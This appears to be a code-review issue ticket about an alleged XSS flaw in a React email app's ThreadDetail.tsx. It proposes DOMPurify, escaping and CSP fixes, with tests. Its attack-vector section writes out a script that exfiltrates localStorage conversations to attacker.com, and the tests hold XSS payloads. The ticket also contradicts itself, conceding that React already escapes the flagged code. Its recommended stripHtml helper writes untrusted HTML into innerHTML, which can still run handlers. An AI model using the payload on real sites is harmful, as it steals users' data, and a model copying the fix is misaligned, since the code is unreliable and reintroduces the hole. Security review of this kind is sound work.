---
status: pending
priority: p1
issue_id: "003"
tags: [code-review, security, xss]
dependencies: []
---

# Fix XSS Vulnerability in Conversation Content Rendering

## Problem Statement

**Critical security vulnerability**: User-supplied conversation content and assistant-generated drafts are rendered without HTML escaping in ThreadDetail.tsx, allowing arbitrary JavaScript execution via XSS attacks.

**Why it matters**:
- Attackers can inject malicious scripts that execute in user's browser
- Stored XSS persists across page refreshes (localStorage)
- Can steal session data, exfiltrate localStorage conversations, or perform actions as the user
- OWASP Top 10: A03 Injection vulnerability

## Findings

**From Security Review:**
- Lines 152-154: `{msg.content}` renders raw conversation messages
- Line 129: `{msg.conversation}` renders email body from external sources
- Line 193: `{draft}` renders draft content

**Attack Vector:**
```javascript
// User enters malicious instructions:
<img src=x onerror="alert(document.cookie)">
<script>fetch('https://attacker.com/steal?data=' + localStorage.getItem('email-workflow-conversations'))</script>

// When rendered in conversation history, script executes and:
// - Steals session cookies
// - Exfiltrates all stored conversations
// - Performs unauthorized actions
```

**Impact:**
- Session hijacking
- Data exfiltration (all email conversations)
- Unauthorized API calls
- Persistent XSS across page refreshes

## Proposed Solutions

### Solution 1: Use DOMPurify (Recommended for Rich Text)
**Pros:**
- Industry-standard sanitization library
- Allows safe HTML rendering (links, formatting)
- Actively maintained, battle-tested
- Handles edge cases comprehensively

**Cons:**
- Adds ~30KB to bundle
- Requires dangerouslySetInnerHTML (looks scary but is safe with DOMPurify)

**Effort:** Low (1 hour)
**Risk:** Low

**Implementation:**
```typescript
import DOMPurify from 'isomorphic-dompurify';

<div
  className="text-sm whitespace-pre-wrap"
  dangerouslySetInnerHTML={{
    __html: DOMPurify.sanitize(msg.content, {
      ALLOWED_TAGS: [], // Plain text only, strip all HTML
      KEEP_CONTENT: true,
    })
  }}
/>

// Or allow some formatting:
DOMPurify.sanitize(msg.content, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
  ALLOWED_ATTR: ['href'],
})
```

### Solution 2: React Escaping Only (Recommended for Plain Text)
**Pros:**
- No dependencies
- React automatically escapes `{variable}` expressions
- Simplest solution
- Zero bundle impact

**Cons:**
- No HTML formatting allowed
- Assumes content is meant to be plain text

**Effort:** Very Low (15 minutes)
**Risk:** Very Low

**Implementation:**
```typescript
// Current (vulnerable):
<div className="text-sm whitespace-pre-wrap">
  {msg.content}
</div>

// Fixed (if content is HTML string):
// Convert HTML to plain text first
<div className="text-sm whitespace-pre-wrap">
  {stripHtml(msg.content)}
</div>

function stripHtml(html: string): string {
  const tmp = document.createElement('div');
  tmp.innerHTML = html;
  return tmp.textContent || tmp.innerText || '';
}
```

### Solution 3: Content Security Policy Headers
**Pros:**
- Defense-in-depth layer
- Blocks inline scripts even if XSS exists
- Protects entire application

**Cons:**
- Doesn't fix root cause
- Can break legitimate inline scripts
- Requires server configuration

**Effort:** Low (30 minutes)
**Risk:** Low

**Implementation:**
```typescript
// next.config.js
const securityHeaders = [
  {
    key: 'Content-Security-Policy',
    value: "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';",
  },
];

module.exports = {
  async headers() {
    return [{ source: '/(.*)', headers: securityHeaders }];
  },
};
```

## Recommended Action

**Use Solution 2 (React escaping) + Solution 3 (CSP)**. The content appears to be plain text email drafts/instructions, not rich HTML. If HTML formatting is needed later, add DOMPurify.

## Technical Details

**Affected Files:**
- `/Users/benigeri/Projects/productiviy-system/email-workflow/app/inbox/ThreadDetail.tsx`
  - Line 129: `{msg.conversation}`
  - Line 152-154: `{msg.content}`
  - Line 193: `{draft}`

**Current Vulnerable Code:**
```tsx
<div className="text-sm whitespace-pre-wrap">
  {msg.content}  // ⚠️ If msg.content contains HTML, React renders it as text
                 // BUT if using dangerouslySetInnerHTML anywhere, this is vulnerable
</div>
```

**Verify Content Type:**
- Check API responses: are drafts plain text or HTML?
- Check Braintrust API: does it return HTML or plain text?
- If plain text → React escaping is sufficient
- If HTML → Must use DOMPurify

## Acceptance Criteria

- [ ] All user-generated content is sanitized before rendering
- [ ] All assistant-generated content is sanitized before rendering
- [ ] All email message bodies are sanitized before rendering
- [ ] XSS test vectors do not execute (see test cases below)
- [ ] Content displays correctly (no broken rendering)
- [ ] CSP headers block inline scripts
- [ ] Security tests added to prevent regression

**Test Cases:**
```typescript
describe('XSS Prevention', () => {
  it('should not execute script tags', () => {
    const malicious = '<script>alert("xss")</script>';
    addMessage('thread-1', 'user', malicious);
    render(<ThreadDetail thread={...} messages={[...]} />);
    // Verify alert() is not called
  });

  it('should not execute event handlers', () => {
    const malicious = '<img src=x onerror="alert(1)">';
    addMessage('thread-1', 'user', malicious);
    render(<ThreadDetail thread={...} messages={[...]} />);
    // Verify alert() is not called
  });

  it('should not execute inline JavaScript', () => {
    const malicious = '<a href="javascript:alert(1)">Click</a>';
    addMessage('thread-1', 'user', malicious);
    render(<ThreadDetail thread={...} messages={[...]} />);
    // Verify clicking link doesn't execute
  });
});
```

## Work Log

**2026-01-10**: Issue identified in PR #60 security audit

## Resources

- **PR #60**: https://github.com/benigeri/productiviy-system/pull/60
- **File**: `/Users/benigeri/Projects/productiviy-system/email-workflow/app/inbox/ThreadDetail.tsx`
- **DOMPurify**: https://github.com/cure53/DOMPurify
- **OWASP XSS**: https://owasp.org/www-community/attacks/xss/
- **React Security**: https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html
